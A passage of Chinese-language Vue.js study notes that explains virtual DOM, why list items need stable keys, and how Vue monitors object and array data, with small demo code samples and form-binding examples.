<p><strong>2、<code>Render</code> 树是 <code>DOM</code> 树和 <code>CSS</code> 样式表构建完毕后才开始构建的？</strong> 这三个过程在实际进行的时候并不是完全独立的，而是会有交叉，会一边加载，一边解析，以及一边渲染。</p>
<p><strong>3、<code>CSS</code> 的解析注意点？</strong> <code>CSS</code> 的解析是从右往左逆向解析的，嵌套标签越多，解析越慢。</p>
<p><strong>4、<code>JS</code> 操作真实 <code>DOM</code> 的代价？</strong>传统DOM结构操作方式对性能的影响很大，原因是频繁操作DOM结构操作会引起页面的重排(reflow)和重绘(repaint)，浏览器不得不频繁地计算布局，重新排列和绘制页面元素，导致浏览器产生巨大的性能开销。直接操作真实<code>DOM</code>的性能特别差，我们可以来演示一遍。</p>
<pre><code class="js">&lt;div id=&quot;app&quot;&gt;&lt;/div&gt;
&lt;script&gt;
    // 获取 DIV 元素
    let box = document.querySelector(&#39;#app&#39;);
    console.log(box);

    // 真实 DOM 操作
    console.time(&#39;a&#39;);
    for (let i = 0; i &lt;= 10000; i++) &#123;
        box.innerHTML = i;
    &#125;
    console.timeEnd(&#39;a&#39;);

    // 虚拟 DOM 操作
    let num = 0;
    console.time(&#39;b&#39;);
    for (let i = 0; i &lt;= 10000; i++) &#123;
        num = i;
    &#125;
    box.innerHTML = num;
    console.timeEnd(&#39;b&#39;);

&lt;/script&gt;
</code></pre>
<img src="image-20230406174540863.png" alt="image-20230406174540863" style="border: 5px solid orange;" />

<blockquote>
<p>从结果中可以看出，操作真实 DOM 的性能是非常差的，所以我们要尽可能的复用，减少 DOM 操作。</p>
</blockquote>
<h5 id="2-虚拟-DOM-的好处"><a href="#2-虚拟-DOM-的好处" class="headerlink" title="2. 虚拟 DOM 的好处"></a>2. <strong>虚拟 DOM 的好处</strong></h5><p>​    虚拟 <code>DOM</code> 就是为了解决浏览器性能问题而被设计出来的。如前，若一次操作中有 10 次更新 <code>DOM</code> 的动作，虚拟 <code>DOM</code> 不会立即操作 <code>DOM</code>，而是将这 10 次更新的 <code>diff</code> 内容保存到本地一个 <code>JS</code> 对象中，最终将这个 <code>JS</code> 对象一次性 <code>attch</code> 到 <code>DOM</code> 树上，再进行后续操作，避免大量无谓的计算量。所以，用 <code>JS</code> 对象模拟 <code>DOM</code> 节点的好处是，页面的更新可以先全部反映在 <code>JS</code> 对象(虚拟 <code>DOM</code> )上，操作内存中的 <code>JS</code> 对象的速度显然要更快，等更新完成后，再将最终的 <code>JS</code> 对象映射成真实的 <code>DOM</code>，交由浏览器去绘制。</p>
<p>​    虽然这一个虚拟 DOM 带来的一个优势，但并不是全部。虚拟 DOM 最大的优势在于抽象了原本的渲染过程，实现了跨平台的能力，而不仅仅局限于浏览器的 DOM，可以是安卓和 IOS 的原生组件，可以是近期很火热的小程序，也可以是各种GUI。</p>
<p>​    回到最开始的问题，虚拟 DOM 到底是什么，说简单点，就是一个普通的 JavaScript 对象，包含了 <code>tag</code>、<code>props</code>、<code>children</code> 三个属性。</p>
<blockquote>
<p>接下来我们手动实现下 虚拟 DOM。</p>
<p>分两种实现方式：</p>
<p>一种原生 js DOM 操作实现；</p>
<p>另一种主流虚拟 DOM 库（snabbdom、virtual-dom）的实现（用h函数渲染）（暂时还不理解）</p>
</blockquote>
<p><strong>算法实现</strong></p>
<p><strong>（1）</strong>用 JS 对象模拟 DOM 树：</p>
<pre><code class="html">&lt;div id=&quot;virtual-dom&quot;&gt;
    &lt;p&gt;Virtual DOM&lt;/p&gt;
    &lt;ul id=&quot;list&quot;&gt;
      &lt;li class=&quot;item&quot;&gt;Item 1&lt;/li&gt;
      &lt;li class=&quot;item&quot;&gt;Item 2&lt;/li&gt;
      &lt;li class=&quot;item&quot;&gt;Item 3&lt;/li&gt;
    &lt;/ul&gt;
    &lt;div&gt;Hello World&lt;/div&gt;
&lt;/div&gt; 
</code></pre>
<p>我们用 <code>JavaScript</code> 对象来表示 <code>DOM</code> 节点，使用对象的属性记录节点的类型、属性、子节点等。</p>
<pre><code class="js">/**
 * Element virdual-dom 对象定义
 * @param &#123;String&#125; tagName - dom 元素名称
 * @param &#123;Object&#125; props - dom 属性
 * @param &#123;Array&lt;Element|String&gt;&#125; - 子节点
 */
function Element(tagName, props, children) &#123;
    this.tagName = tagName;
    this.props = props;
    this.children = children;
    // dom 元素的 key 值，用作唯一标识符
    if (props.key) &#123;
        this.key = props.key
    &#125;
&#125;
function el(tagName, props, children) &#123;
    return new Element(tagName, props, children);
&#125;
</code></pre>
<p>构建虚拟的  <code>DOM</code>  ，用 javascript 对象来表示</p>
<pre><code class="js">let ul = el(&#39;div&#39;, &#123; id: &#39;Virtual DOM&#39; &#125;, [
    el(&#39;p&#39;, &#123;&#125;, [&#39;Virtual DOM&#39;]),
    el(&#39;ul&#39;, &#123; id: &#39;list&#39; &#125;, [
        el(&#39;li&#39;, &#123; class: &#39;item&#39; &#125;, [&#39;Item 1&#39;]),
        el(&#39;li&#39;, &#123; class: &#39;item&#39; &#125;, [&#39;Item 2&#39;]),
        el(&#39;li&#39;, &#123; class: &#39;item&#39; &#125;, [&#39;Item 3&#39;])
    ]),
    el(&#39;div&#39;, &#123;&#125;, [&#39;Hello, World&#39;])
])
</code></pre>
<p>现在 <code>ul</code> 就是我们用 <code>JavaScript</code> 对象表示的 <code>DOM</code> 结构，我们输出查看 <code>ul</code> 对应的数据结构如下：</p>
<img src="image-20230406174554265.png" style="border: 5px solid orange;" />

<p><strong>（2）</strong>将用 js 对象表示的虚拟 DOM 转换成真实 DOM：需要用到 js 原生操作 DOM 的方法。</p>
<pre><code class="js">/**
 * render 将virdual-dom 对象渲染为实际 DOM 元素
 */
Element.prototype.render = function () &#123;
    // 创建节点
    let el = document.createElement(this.tagName);

    let props = this.props;
    // 设置节点的 DOM 属性
    for (let propName in props) &#123;
        let propValue = props[propName];
        el.setAttribute(propName, propValue)
    &#125;

    let children = this.children || []
    for (let child of children) &#123;
        let childEl = (child instanceof Element)
        ? child.render() // 如果子节点也是虚拟 DOM, 递归构建 DOM 节点
        : document.createTextNode(child) // 如果是文本，就构建文本节点

        el.appendChild(childEl);
    &#125;

    return el;
&#125;
</code></pre>
<p>我们通过查看以上 <code>render</code> 方法，会根据 <code>tagName</code> 构建一个真正的 <code>DOM</code> 节点，然后设置这个节点的属性，最后递归地把自己的子节点也构建起来。</p>
<p>我们将构建好的 <code>DOM</code> 结构添加到页面 <code>body</code> 上面，如下：</p>
<pre><code class="js">let ulRoot = ul.render();
document.body.appendChild(ulRoot);
</code></pre>
<p>这样，页面 <code>body</code> 里面就有真正的 <code>DOM</code> 结构，效果如下图所示：</p>
<img src="image-20230406174604757.png" alt="image-20230406174604757" style="border: 5px solid orange;" />

<blockquote>
<p>我们知道虚拟 DOM 的好处和虚拟 DOM 的实现后就要讲讲 key 的作用了。</p>
<p>贴一下上面实现地完整代码</p>
</blockquote>
<pre><code class="html">&lt;script&gt;
    /**
         * Element virdual-dom 对象定义
         * @param &#123;String&#125; tagName - dom 元素名称
         * @param &#123;Object&#125; props - dom 属性
         * @param &#123;Array&lt;Element|String&gt;&#125; - 子节点
         */
    function Element(tagName, props, children) &#123;
        this.tagName = tagName;
        this.props = props;
        this.children = children;
        // dom 元素的 key 值，用作唯一标识符
        if (props.key) &#123;
            this.key = props.key
        &#125;
    &#125;

    function el(tagName, props, children) &#123;
        return new Element(tagName, props, children);
    &#125;

    let ul = el(&#39;div&#39;, &#123; id: &#39;Virtual DOM&#39; &#125;, [
        el(&#39;p&#39;, &#123;&#125;, [&#39;Virtual DOM&#39;]),
        el(&#39;ul&#39;, &#123; id: &#39;list&#39; &#125;, [
            el(&#39;li&#39;, &#123; class: &#39;item&#39; &#125;, [&#39;Item 1&#39;]),
            el(&#39;li&#39;, &#123; class: &#39;item&#39; &#125;, [&#39;Item 2&#39;]),
            el(&#39;li&#39;, &#123; class: &#39;item&#39; &#125;, [&#39;Item 3&#39;])
        ]),
        el(&#39;div&#39;, &#123;&#125;, [&#39;Hello, World&#39;])
    ])

    /**
             * render 将virdual-dom 对象渲染为实际 DOM 元素
             */
    Element.prototype.render = function () &#123;
        // 创建节点
        let el = document.createElement(this.tagName);

        let props = this.props;
        // 设置节点的 DOM 属性
        for (let propName in props) &#123;
            let propValue = props[propName];
            el.setAttribute(propName, propValue)
        &#125;

        let children = this.children || []
        for (let child of children) &#123;
            let childEl = (child instanceof Element)
            ? child.render() // 如果子节点也是虚拟 DOM, 递归构建 DOM 节点
            : document.createTextNode(child) // 如果是文本，就构建文本节点

            el.appendChild(childEl);
        &#125;

        return el;
    &#125;

    let ulRoot = ul.render();
    document.body.appendChild(ulRoot);
    console.log(ul);
&lt;/script&gt;
</code></pre>
<h5 id="3-虚拟DOM中key的作用"><a href="#3-虚拟DOM中key的作用" class="headerlink" title="3. 虚拟DOM中key的作用"></a>3. <strong>虚拟DOM中key的作用</strong></h5><p>key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：</p>
<ul>
<li>旧虚拟DOM中找到了与新虚拟DOM相同的key：<ul>
<li>①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！</li>
<li>②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。</li>
</ul>
</li>
<li>旧虚拟DOM中未找到与新虚拟DOM相同的key<ul>
<li>创建新的真实DOM，随后渲染到到页面。</li>
</ul>
</li>
</ul>
<blockquote>
<p>好了，我们知道了最简单的key的原理，如果要继续研究下去就要涉及到vue的核心之一-Diff算法，后面会详细介绍。</p>
</blockquote>
<h5 id="4-用index作为key可能会引发的问题："><a href="#4-用index作为key可能会引发的问题：" class="headerlink" title="4. 用index作为key可能会引发的问题："></a>4. 用index作为key可能会引发的问题：</h5><p><strong>若对数据进行：逆序添加、逆序删除等破坏顺序操作：</strong></p>
<p>会产生没有必要的真实DOM更新 ==&gt; 界面效果没问题, 但效率低。</p>
<blockquote>
<p>案例</p>
</blockquote>
<pre><code class="html">&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    &lt;!-- 遍历数组 --&gt;
    &lt;h2&gt;人员列表（遍历数组）&lt;/h2&gt;
    &lt;button @click.once=&quot;add&quot;&gt;添加一个老刘&lt;/button&gt;
    &lt;ul&gt;
        &lt;li v-for=&quot;(p,index) of persons&quot; :key=&quot;index&quot;&gt;
            &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;
            &lt;input type=&quot;text&quot;&gt;
        &lt;/li&gt;
    &lt;/ul&gt;
&lt;/div&gt;

&lt;script type=&quot;text/javascript&quot;&gt;
    Vue.config.productionTip = false

    new Vue(&#123;
        el: &#39;#root&#39;,
        data: &#123;
            persons: [
                &#123; id: &#39;001&#39;, name: &#39;张三&#39;, age: 18 &#125;,
                &#123; id: &#39;002&#39;, name: &#39;李四&#39;, age: 19 &#125;,
                &#123; id: &#39;003&#39;, name: &#39;王五&#39;, age: 20 &#125;
            ]
        &#125;,
        methods: &#123;
            add() &#123;
                const p = &#123; id: &#39;004&#39;, name: &#39;老刘&#39;, age: 40 &#125;
                this.persons.unshift(p)
            &#125;
        &#125;,
    &#125;);
&lt;/script&gt;
</code></pre>
<blockquote>
<p>解释：</p>
</blockquote>
<p>初始数据</p>
<p>persons: [<br>{ id: ‘001’, name: ‘张三’, age: 18 },<br>{ id: ‘002’, name: ‘李四’, age: 19 },<br>{ id: ‘003’, name: ‘王五’, age: 20 }<br>]</p>
<p><strong>vue根据数据生成虚拟 DOM</strong></p>
<p>初始虚拟 DOM</p>
<pre><code class="html">&lt;li key=&#39;0&#39;&gt;张三-18&lt;input type=&quot;text&quot;&gt;&lt;/li&gt;
&lt;li key=&#39;1&#39;&gt;李四-19&lt;input type=&quot;text&quot;&gt;&lt;/li&gt;
&lt;li key=&#39;2&#39;&gt;王五-20&lt;input type=&quot;text&quot;&gt;&lt;/li&gt;
</code></pre>
<p><strong>将虚拟 DOM 转为 真实 DOM</strong></p>
<img src="image-20230406174612346.png" alt="image-20230406174612346" style="border: 5px solid orange;" />

<p><code>this.persons.unshift(&#123; id: &#39;004&#39;, name: &#39;老刘&#39;, age: 40 &#125;)</code></p>
<p>在 persons 数组最前面添加上 { id: ‘004’, name: ‘老刘’, age: 40 }</p>
<p>新数据：</p>
<p>persons: [</p>
<p>​        { id: ‘004’, name: ‘老刘’, age: 40 },</p>
<p>​        { id: ‘001’, name: ‘张三’, age: 18 },<br>​        { id: ‘002’, name: ‘李四’, age: 19 },<br>​        { id: ‘003’, name: ‘王五’, age: 20 }<br>]</p>
<p><strong>vue根据数据生成虚拟 DOM</strong></p>
<p>新虚拟 DOM</p>
<pre><code class="html">&lt;li key=&#39;0&#39;&gt;老刘-30&lt;input type=&quot;text&quot;&gt;&lt;/li&gt;
&lt;li key=&#39;1&#39;&gt;张三-18&lt;input type=&quot;text&quot;&gt;&lt;/li&gt;
&lt;li key=&#39;3&#39;&gt;李四-19&lt;input type=&quot;text&quot;&gt;&lt;/li&gt;
&lt;li key=&#39;4&#39;&gt;王五-20&lt;input type=&quot;text&quot;&gt;&lt;/li&gt;
</code></pre>
<p><strong>将虚拟 DOM 转为 真实 DOM</strong></p>
<img src="image-20230406174617528.png" alt="image-20230406174617528" style="border: 5px solid orange;" />

<p>因为老刘被插到第一个，重刷了 key 的值，vue Diff 算法 根据 key 的值 判断 虚拟DOM 全部发生了改变，然后全部重新生成新的 真实 DOM。实际上，张三，李四，王五并没有发生更改，是可以直接复用之前的真实 DOM，而因为 key 的错乱，导致要全部重新生成，造成了性能的浪费。</p>
<blockquote>
<p>来张尚硅谷的图</p>
</blockquote>
<p><img src="/2023/04/17/15_Vue%E7%AD%86%E8%A8%98/image-20230406174622375.png" alt="image-20230406174622375"></p>
<p><strong>如果结构中还包含输入类的DOM：</strong></p>
<p>会产生错误DOM更新 ==&gt; 界面有问题。</p>
<blockquote>
<p>这回造成的就不是性能浪费了，会直接导致页面的错误</p>
</blockquote>
<img src="image-20230406174625934.png" alt="image-20230406174625934" style="border: 5px solid orange;" />



<h5 id="5-结论："><a href="#5-结论：" class="headerlink" title="5. 结论："></a>5. 结论：</h5><p>面試題：react、vue中的key有什麼作用? (key的內部原理)</p>
<ol>
<li>虛擬DOM中key的作用<ul>
<li>key是虛擬DOM對象的標識，當數據發生變化時，Vue會根據【新數據】生成【新的虛擬DOM】，隨後Vue進行【新虛擬DOM】與【舊虛擬DOM】的差異比較，比較規則如後下</li>
</ul>
</li>
<li>對比規則：<ul>
<li>舊虛擬DOM中找到了與新虛擬DOM相同的key<ul>
<li>若虛擬DOM中的內容沒變，直接使用之前的真實DOM</li>
<li>若虛擬DOM中的內容變了，則生成新的真實DOM，隨後替換掉頁面中之前的真實DOM</li>
</ul>
</li>
<li>舊虛擬DOM未找到了與新虛擬DOM相同的key<ul>
<li>創建新的真實DOM，隨後渲染到頁面</li>
</ul>
</li>
</ul>
</li>
<li>用index作為key可能會引發的問題：<ul>
<li>若對數據進行：逆序添加、逆序刪除等破壞順序操作<ul>
<li>會產生沒有必要的真實DOM更新 ==&gt; 介面效果沒問題，但效率低</li>
</ul>
</li>
<li>如果結構中還包含輸入類的DOM<ul>
<li>會產生錯誤DOM更新 ==&gt; 介面有問題</li>
</ul>
</li>
</ul>
</li>
<li>開發中如何選擇key?<ul>
<li>最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值</li>
<li>如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的</li>
</ul>
</li>
</ol>
<blockquote>
<p>来张尚硅谷的图，正经使用 key</p>
</blockquote>
<p><img src="/2023/04/17/15_Vue%E7%AD%86%E8%A8%98/image-20230406174631491.png" alt="image-20230406174631491"></p>
<h3 id="1-13-3-列表過濾"><a href="#1-13-3-列表過濾" class="headerlink" title="1.13.3 列表過濾"></a>1.13.3 <strong>列表過濾</strong></h3><blockquote>
<p>使用watch實現</p>
</blockquote>
<img src="image-20230407001845676.png" alt="image-20230407001845676" style="zoom:67%;" />



<blockquote>
<p>使用computed實現</p>
</blockquote>
<img src="image-20230407002120246.png" alt="image-20230407002120246" style="zoom:67%;" />



<p>:bulb: 當computed跟watch都能實現功能時，優先使用computed</p>
<h3 id="1-13-4-列表排序"><a href="#1-13-4-列表排序" class="headerlink" title="1.13.4 列表排序"></a>1.13.4 <strong>列表排序</strong></h3><blockquote>
<p>代碼</p>
</blockquote>
<img src="image-20230407002313091.png" alt="image-20230407002313091" style="zoom:67%;" />



<h2 id="1-14-vue-监测數據改變的原理解析"><a href="#1-14-vue-监测數據改變的原理解析" class="headerlink" title="1.14 vue 监测數據改變的原理解析"></a>1.14 vue 监测數據改變的原理解析</h2><h3 id="1-14-1-更新數據時的問題"><a href="#1-14-1-更新數據時的問題" class="headerlink" title="1.14.1 更新數據時的問題"></a>1.14.1 更新數據時的問題</h3><p>先来个案例引入一下：</p>
<pre><code class="html">&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    &lt;h2&gt;人员列表&lt;/h2&gt;
    &lt;button @click=&quot;updateMei&quot;&gt;更新马冬梅的信息&lt;/button&gt;
    &lt;ul&gt;
        &lt;li v-for=&quot;(p,index) of persons&quot; :key=&quot;p.id&quot;&gt;
            &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;-&#123;&#123;p.sex&#125;&#125;
        &lt;/li&gt;
    &lt;/ul&gt; 
&lt;/div&gt;

&lt;script type=&quot;text/javascript&quot;&gt;
    Vue.config.productionTip = false

    const vm = new Vue(&#123;
        el:&#39;#root&#39;,
        data:&#123;
            persons:[
                &#123;id:&#39;001&#39;,name:&#39;马冬梅&#39;,age:30,sex:&#39;女&#39;&#125;,
                &#123;id:&#39;002&#39;,name:&#39;周冬雨&#39;,age:31,sex:&#39;女&#39;&#125;,
                &#123;id:&#39;003&#39;,name:&#39;周杰伦&#39;,age:18,sex:&#39;男&#39;&#125;,
                &#123;id:&#39;004&#39;,name:&#39;温兆伦&#39;,age:19,sex:&#39;男&#39;&#125;
            ]
        &#125;,
        methods: &#123;
            updateMei()&#123;
                // this.persons[0].name = &#39;马老师&#39; //奏效
                // this.persons[0].age = 50 //奏效
                // this.persons[0].sex = &#39;男&#39; //奏效
                this.persons[0] = &#123;id:&#39;001&#39;,name:&#39;马老师&#39;,age:50,sex:&#39;男&#39;&#125; //不奏效
                // this.persons.splice(0,1,&#123;id:&#39;001&#39;,name:&#39;马老师&#39;,age:50,sex:&#39;男&#39;&#125;)
            &#125;
        &#125;
    &#125;) 

&lt;/script&gt;
</code></pre>
<p>点击更新马冬梅的信息，马冬梅的数据并没有发生改变。</p>
<img src="image-20230406174638041.png" alt="image-20230406174638041" style="border: 5px solid orange; zoom: 67%;" />

<p>我们来看看控制台：<br><img src="image-20230406174642987.png" alt="image-20230406174642987" style="border: 5px solid orange; zoom: 67%;" /></p>
<p>控制台上的数据发生了改变，说明，这个更改的数据并没有被 vue 监测到。</p>
<h3 id="1-14-2-Vue監測數據改變的原理-對象"><a href="#1-14-2-Vue監測數據改變的原理-對象" class="headerlink" title="1.14.2 Vue監測數據改變的原理_對象"></a>1.14.2 Vue監測數據改變的原理_對象</h3><h5 id="1-Vue-如何监测对象里的数据"><a href="#1-Vue-如何监测对象里的数据" class="headerlink" title="1.  Vue 如何监测对象里的数据"></a>1.  Vue 如何监测对象里的数据</h5><blockquote>
<p>代码</p>
</blockquote>
<pre><code class="html">&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    &lt;h2&gt;学校名称：&#123;&#123;name&#125;&#125;&lt;/h2&gt;
    &lt;h2&gt;学校地址：&#123;&#123;address&#125;&#125;&lt;/h2&gt;
&lt;/div&gt;

&lt;script type=&quot;text/javascript&quot;&gt;
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    const vm = new Vue(&#123;
        el:&#39;#root&#39;,
        data:&#123;
            name:&#39;浙江师范大学&#39;,
            address:&#39;金华&#39;,
            student:&#123;
                name:&#39;tom&#39;,
                age:&#123;
                    rAge:40,
                    sAge:29,
                &#125;,
                friends:[
                    &#123;name:&#39;jerry&#39;,age:35&#125;
                ]
            &#125;
        &#125;
    &#125;)
&lt;/script&gt;
</code></pre>
<img src="image-20230406174651004.png" alt="image-20230406174651004" style="zoom: 67%; border: 5px solid orange;" />

<blockquote>
<p>讲一下解析模板后面的操作—》调用 set 方法时，就会去解析模板—–&gt;生成新的虚拟 DOM—–&gt;新旧DOM 对比 —–&gt; 更新页面</p>
</blockquote>
<h5 id="2-手動模拟-vue-中的数据监测"><a href="#2-手動模拟-vue-中的数据监测" class="headerlink" title="2. 手動模拟 vue 中的数据监测"></a>2. 手動模拟 vue 中的数据监测</h5><pre><code class="html">&lt;script type=&quot;text/javascript&quot; &gt;

    let data = &#123;
        name:&#39;尚硅谷&#39;,
        address:&#39;北京&#39;,
    &#125;

    //创建一个监视的实例对象，用于监视data中属性的变化
    const obs = new Observer(data)        
    console.log(obs)    

    //准备一个vm实例对象
    let vm = &#123;&#125;
    vm._data = data = obs

    function Observer(obj)&#123;
        //汇总对象中所有的属性形成一个数组
        const keys = Object.keys(obj)
        //遍历
        keys.forEach((k) =&gt; &#123;
            Object.defineProperty(this, k, &#123;
                get() &#123;
                    return obj[k]
                &#125;,
                set(val) &#123;
                    console.log(`$&#123;k&#125;被改了，我要去解析模板，生成虚拟DOM.....我要开始忙了`)
                    obj[k] = val
                &#125;
            &#125;)
        &#125;)
    &#125;
&lt;/script&gt;
</code></pre>
<img src="image-20230406174705811.png" alt="image-20230406174705811" style="zoom:80%;border: 5px solid orange;" />

<h3 id="1-14-3-Vue-set-的使用"><a href="#1-14-3-Vue-set-的使用" class="headerlink" title="1.14.3 Vue.set 的使用"></a>1.14.3 <strong>Vue.set 的使用</strong></h3><p><em><strong>Vue.set(target，propertyName/index，value)</strong></em> 或</p>
<p><em><strong>vm.$set(target，propertyName/index，value)</strong></em></p>
<p><strong>用法</strong>：</p>
<p>向响应式对象中添加一个 property，并确保这个新 property 同样是响应式的，且触发视图更新。它必须用于向响应式对象上添加新 property，因为 Vue 无法探测普通的新增 property (比如 <code>vm.myObject.newProperty = &#39;hi&#39;</code>)</p>
<blockquote>
<p>代码</p>
</blockquote>
<pre><code class="html">&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    &lt;h1&gt;学生信息&lt;/h1&gt;
    &lt;button @click=&quot;addSex&quot;&gt;添加性别属性，默认值：男&lt;/button&gt; &lt;br/&gt;
&lt;/div&gt;

&lt;script type=&quot;text/javascript&quot;&gt;
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    const vm = new Vue(&#123;
        el:&#39;#root&#39;,
        data:&#123;
            student:&#123;
                name:&#39;tom&#39;,
                age:18,
                hobby:[&#39;抽烟&#39;,&#39;喝酒&#39;,&#39;烫头&#39;],
                friends:[
                    &#123;name:&#39;jerry&#39;,age:35&#125;,
                    &#123;name:&#39;tony&#39;,age:36&#125;
                ]
            &#125;
        &#125;,
        methods: &#123;
            addSex()&#123;
                // Vue.set(this.student,&#39;sex&#39;,&#39;男&#39;)
                this.$set(this.student,&#39;sex&#39;,&#39;男&#39;)
            &#125;
        &#125;
    &#125;)
&lt;/script&gt;
</code></pre>
<p>Vue.set() 或 vm.$set 有缺陷：</p>
<p><img src="/2023/04/17/15_Vue%E7%AD%86%E8%A8%98/image-20230407094611814.png"></p>
<blockquote>
<ul>
<li><p>Vue實例： vm</p>
</li>
<li><p>Vue實例的跟數據對象：data 和 _data</p>
</li>
</ul>
</blockquote>
<h3 id="1-14-4-Vue監測數據改變的原理-數組"><a href="#1-14-4-Vue監測數據改變的原理-數組" class="headerlink" title="1.14.4 Vue監測數據改變的原理_數組"></a>1.14.4 Vue監測數據改變的原理_數組</h3><blockquote>
<p>先写个代码案例</p>
</blockquote>
<pre><code class="html">&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    &lt;h2&gt;爱好&lt;/h2&gt;
    &lt;ul&gt;
        &lt;li v-for=&quot;(h,index) in student.hobby&quot; :key=&quot;index&quot;&gt;
            &#123;&#123;h&#125;&#125;
        &lt;/li&gt;
    &lt;/ul&gt;
    &lt;h2&gt;朋友们&lt;/h2&gt;
    &lt;ul&gt;
        &lt;li v-for=&quot;(f,index) in student.friends&quot; :key=&quot;index&quot;&gt;
            &#123;&#123;f.name&#125;&#125;--&#123;&#123;f.age&#125;&#125;
        &lt;/li&gt;
    &lt;/ul&gt;
&lt;/div&gt;

&lt;script type=&quot;text/javascript&quot;&gt;
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    const vm = new Vue(&#123;
        el:&#39;#root&#39;,
        data:
            student:&#123;
                name:&#39;tom&#39;,
                age:&#123;
                    rAge:40,
                    sAge:29,
                &#125;,
                hobby:[&#39;抽烟&#39;,&#39;喝酒&#39;,&#39;烫头&#39;],
                friends:[
                    &#123;name:&#39;jerry&#39;,age:35&#125;,
                    &#123;name:&#39;tony&#39;,age:36&#125;
                ]
            &#125;
        &#125;,
        methods: &#123;

        &#125;
    &#125;)
&lt;/script&gt;
</code></pre>
<img src="image-20230406174718099.png" alt="image-20230406174718099" style="zoom:80%;border: 5px solid orange;" />

<blockquote>
<p>所以我们通过 vm._data.student.hobby[0] = ‘aaa’ // 不奏效</p>
<p>vue 监测在数组那没有 getter 和 setter，所以监测不到数据的更改，也不会引起页面的更新</p>
</blockquote>
<img src="image-20230406174725994.png" alt="image-20230406174725994" style="zoom:80%;border: 5px solid orange;" />

<p>既然 vue 在对数组无法通过 getter 和 setter 进行数据监视，那 vue 到底如何监视数组数据的变化呢？</p>
<p>vue对数组的监测是通过 包装数组上常用的用于修改数组的方法来实现的。</p>
<p>vue官网的解释：</p>
<img src="image-20230406174730443.png" alt="image-20230406174730443" style="zoom:80%;border: 5px solid orange;" />

<h3 id="1-14-5-總結Vue數據監測："><a href="#1-14-5-總結Vue數據監測：" class="headerlink" title="1.14.5 總結Vue數據監測："></a>1.14.5 <strong>總結Vue數據監測：</strong></h3><p>Vue监视数据的原理：</p>
<ul>
<li><p>vue会监视data中所有层次的数据</p>
</li>
<li><p>如何监测对象中的数据？</p>
<p>通过setter实现监视，且要在new Vue时就传入要监测的数据。</p>
<ul>
<li><p>对象中后追加的属性，Vue默认不做响应式处理</p>
</li>
<li><p>如需给后添加的属性做响应式，请使用如下API：</p>
<p>Vue.set(target，propertyName/index，value) 或</p>
<p>vm.$set(target，propertyName/index，value)</p>
</li>
</ul>
</li>
<li><p>如何监测数组中的数据？</p>
<p>通过包裹数组更新元素的方法实现，本质就是做了两件事：</p>
<ul>
<li>调用原生对应的方法对数组进行更新</li>
<li>重新解析模板，进而更新页面</li>
</ul>
</li>
<li><p>在Vue修改数组中的某个元素一定要用如下方法：</p>
<ul>
<li>使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()</li>
<li>Vue.set() 或 vm.$set()</li>
</ul>
</li>
</ul>
<blockquote>
<p>特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！</p>
</blockquote>
<h2 id="1-15-收集表单数据"><a href="#1-15-收集表单数据" class="headerlink" title="1.15 收集表单数据"></a>1.15 收集表单数据</h2><p>若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。</p>
<pre><code class="html">&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    &lt;form @submit.prevent=&quot;demo&quot;&gt;
        账号：&lt;input type=&quot;text&quot; v-model.trim=&quot;userInfo.account&quot;&gt; &lt;br/&gt;&lt;br/&gt;
        密码：&lt;input type=&quot;password&quot; v-model=&quot;userInfo.password&quot;&gt; &lt;br/&gt;&lt;br/&gt;
        年龄：&lt;input type=&quot;number&quot; v-model.number=&quot;userInfo.age&quot;&gt; &lt;br/&gt;&lt;br/&gt;
        &lt;button&gt;提交&lt;/button&gt;
    &lt;/form&gt;
&lt;/div&gt;

&lt;script type=&quot;text/javascript&quot;&gt;
    Vue.config.productionTip = false

    new Vue(&#123;
        el:&#39;#root&#39;,
        data:&#123;
            userInfo:&#123;
                account:&#39;&#39;,
                password:&#39;&#39;,
                age:18,
            &#125;
        &#125;,
        methods: &#123;
            demo()&#123;
                console.log(JSON.stringify(this.userInfo))
            &#125;
        &#125;
    &#125;)
&lt;/script&gt;
</code></pre>
<p>若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。</p>
<pre><code class="html">&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    &lt;form @submit.prevent=&quot;demo&quot;&gt;
        性别：
        男&lt;input type=&quot;radio&quot; name=&quot;sex&quot; v-model=&quot;userInfo.sex&quot; value=&quot;male&quot;&gt;
        女&lt;input type=&quot;radio&quot; name=&quot;sex&quot; v-model=&quot;userInfo.sex&quot; value=&quot;female&quot;&gt;
    &lt;/form&gt;
&lt;/div&gt;

&lt;script type=&quot;text/javascript&quot;&gt;
    Vue.config.productionTip = false

    new Vue(&#123;
        el:&#39;#root&#39;,
        data:&#123;
            userInfo:&#123;
                sex:&#39;female&#39;
            &#125;
        &#125;,
        methods: &#123;
            demo()&#123;
                console.log(JSON.stringify(this.userInfo))
            &#125;
        &#125;
    &#125;)
&lt;/script&gt;
</code></pre>
<p>若：<input type="checkbox"/></p>
<ul>
<li>没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）</li>
<li>配置input的value属性:<ul>
<li>v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）</li>
